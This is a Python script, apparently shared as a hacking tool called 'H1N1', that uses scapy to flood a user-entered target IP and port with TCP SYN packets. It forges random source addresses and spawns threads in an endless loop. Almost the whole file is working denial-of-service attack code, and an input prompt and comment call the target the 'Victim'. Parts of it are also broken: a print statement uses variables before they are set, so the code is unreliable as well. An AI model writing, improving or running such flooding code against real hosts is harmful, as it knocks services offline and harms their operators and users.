#Please install scapy 
#H1N1 tool
import socket, random, sys, threading
from scapy.all import *

#url = raw_input("Victim : ")
print("""\033[32;1m
=====================================
 .##.....##....##...##....##....##..
 .##.....##..####...###...##..####..
 .##.....##....##...####..##....##..
 .#########....##...##.##.##....##..
 .##.....##....##...##..####....##..
 .##.....##....##...##...###....##..
 .##.....##..######.##....##..######
=====================================
= Scrpit By Kents00 | Version 0.001 =
=====================================""") 
#H1N1 menu logo
target = input('IP Target : ')
port = int(input("Port : "))
'''if url.count("/")==2:
	url = url + "/"
m = re.search('(https?\://)?([^/]*)/?.*', url)
host = m.group(2)
target = socket.gethostbyname(host)'''


total = 0

class sendSYN(threading.Thread):
	global target, port
	def __init__(self):
		threading.Thread.__init__(self)
	def run(self):
		global randomip
		i = IP()
		i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
		randomip = i.src
		i.dst = target

		t = TCP()
		t.sport = random.randint(1,65535)
		randomport = t.sport
		t.dport = port
		t.flags = 'S'

		send(i/t, verbose=0)

print("{0}:{1} --> {2}:{3}".format(randomip,randomport,target,port))

print("Flooding %s:%i with SYN packets." % (target, port))
while True:
	sendSYN().start()
